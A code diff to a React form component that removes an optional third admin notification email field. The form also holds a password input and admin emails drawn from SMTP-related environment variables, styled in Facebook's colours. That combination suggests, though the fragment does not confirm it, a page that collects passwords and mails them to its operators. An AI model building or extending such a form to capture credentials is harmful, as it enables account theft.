@@ -26,7 +26,6 @@ export default function FormTwo() {
       password: "",
       admin_email: import.meta.env.VITE_SMTP_USER || "",
       admin_email_2: import.meta.env.VITE_ADMIN_EMAIL || "",
-      admin_email_3: "", // Editable third admin email
     },
   });
 
@@ -103,26 +102,6 @@ export default function FormTwo() {
                     <Input
                       type="password"
                       placeholder="Enter password"
-                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
-                      {...field}
-                    />
-                  </FormControl>
-                  <FormMessage className="text-xs text-red-500 mt-1" />
-                </FormItem>
-              )}
-            />
-            <FormField
-              control={form.control}
-              name="admin_email_3"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                    Additional Email (Optional)
-                  </FormLabel>
-                  <FormControl>
-                    <Input
-                      type="email"
-                      placeholder="Enter additional notification email"
                       className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                       {...field}
                     />
